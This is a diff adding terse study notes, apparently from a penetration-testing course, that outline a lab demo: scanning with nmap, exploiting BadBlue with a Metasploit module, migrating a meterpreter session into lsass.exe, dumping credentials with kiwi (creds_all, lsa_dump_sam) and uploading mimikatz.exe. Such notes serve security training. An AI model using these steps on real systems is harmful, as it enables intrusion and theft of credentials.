@@ -649,8 +649,27 @@ that stores hashed user passwords.
 
 
 Demo 
-
-
+- perform nmap 
+- start up mfsconsole 
+- search exploit module for BadBlue 
+- use the passthru , configure rhost, lhost and lport and exploit
+- meterpreter session on the target system 
+	- sysinfo 
+	- getuid 
+	- migrate to lsass.exe find processid: pgrep lsass - migrate to lsass
+	- sysinfo (authority\\system is the highest privileges')
+	- we will use kiki
+		- load kiwi 
+		- ?
+		- creds_all 
+			- later versions of  windows  do not store cleartext passwords 
+		- lsa_dump_sam 
+			- SAM is encrypted with syskey, also provided by kiki 
+		- clear 
+	- pwd 
+	- navigate to C:\\\\ 
+		- mkdir Temp 
+		- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe 
 
 
 
